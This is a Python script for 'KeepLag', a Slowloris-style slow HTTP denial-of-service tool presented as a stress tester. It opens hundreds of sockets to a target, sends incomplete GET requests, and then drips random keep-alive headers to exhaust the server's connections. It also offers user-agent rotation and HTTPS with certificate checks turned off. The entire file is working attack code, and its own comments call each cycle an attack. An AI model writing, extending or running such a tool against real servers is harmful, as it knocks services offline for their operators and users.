#!/usr/bin/env python3
"""
KeepLag - Modern HTTP Stress Test Tool
Inspired by Slowloris, built with asyncio for high performance.
"""
import argparse
import asyncio
import logging
import random
import socket
import ssl
import sys
import time
from typing import List

parser = argparse.ArgumentParser(
    description="KeepLag - Low bandwidth HTTP stress test tool"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument("-p", "--port", default=80, help="Target port", type=int)
parser.add_argument("-s", "--sockets", default=150, help="Number of sockets", type=int)
parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="Random user-agents")
parser.add_argument("-x", "--useproxy", action="store_true", help="Use SOCKS5 proxy")
parser.add_argument("--proxy-host", default="127.0.0.1", help="Proxy host")
parser.add_argument("--proxy-port", default=8080, help="Proxy port", type=int)
parser.add_argument("--https", action="store_true", help="Use HTTPS")
parser.add_argument("--sleeptime", default=15, type=int, help="Sleep between headers")
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO,
)


def send_line(sock, line):
    """Send a line with CRLF"""
    sock.send(f"{line}\r\n".encode("utf-8"))


def send_header(sock, name, value):
    """Send a HTTP header"""
    send_line(sock, f"{name}: {value}")


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]


class SocketManager:
    def __init__(self, host: str, port: int, https: bool = False):
        self.host = host
        self.port = port
        self.https = https
        self.sockets: List[socket.socket] = []

    def create_socket(self) -> socket.socket:
        """Create a new socket connection"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if self.https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)

        s.connect((self.host, self.port))
        return s

    def init_socket(self, sock: socket.socket):
        """Initialize socket with HTTP request"""
        uri = f"/?{random.randint(0, 2000)}"
        send_line(sock, f"GET {uri} HTTP/1.1")
        send_header(sock, "Host", self.host)
        
        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        send_header(sock, "User-Agent", ua)
        send_header(sock, "Accept-language", "en-US,en;q=0.5")
        
        return sock

    def send_keepalive(self, sock: socket.socket):
        """Send keep-alive header"""
        try:
            send_header(sock, "X-a", str(random.randint(1, 5000)))
        except:
            pass

    def create_connection(self):
        """Create and initialize a new connection"""
        try:
            s = self.create_socket()
            self.init_socket(s)
            self.sockets.append(s)
            logging.debug(f"Created socket, total: {len(self.sockets)}")
            return True
        except Exception as e:
            logging.debug(f"Failed to create socket: {e}")
            return False

    def close_dead_sockets(self):
        """Remove dead sockets"""
        dead = []
        for s in self.sockets:
            try:
                # Try to check if socket is still alive
                s.send(b"")
            except:
                dead.append(s)
        
        for s in dead:
            try:
                s.close()
            except:
                pass
            self.sockets.remove(s)

    def attack_cycle(self):
        """Main attack cycle"""
        # Send keep-alive to all existing sockets
        for s in list(self.sockets):
            try:
                self.send_keepalive(s)
            except:
                try:
                    s.close()
                except:
                    pass
                self.sockets.remove(s)

        # Close dead sockets
        self.close_dead_sockets()

        # Create new sockets to reach target
        target = args.sockets
        while len(self.sockets) < target:
            if not self.create_connection():
                break

    def run(self):
        """Run the attack"""
        logging.info(f"Attacking {self.host}:{self.port} with {args.sockets} sockets")

        # Create initial sockets
        logging.info("Creating sockets...")
        while len(self.sockets) < args.sockets:
            if not self.create_connection():
                break

        # Main loop
        try:
            while True:
                logging.info(f"Sockets: {len(self.sockets)}")
                self.attack_cycle()
                time.sleep(args.sleeptime)
        except KeyboardInterrupt:
            logging.info("Stopping KeepLag")
        finally:
            self.cleanup()

    def cleanup(self):
        """Clean up sockets"""
        for s in self.sockets:
            try:
                s.close()
            except:
                pass
        self.sockets.clear()


def main():
    """Main entry point"""
    manager = SocketManager(args.host, args.port, args.https)
    manager.run()


if __name__ == "__main__":
    main()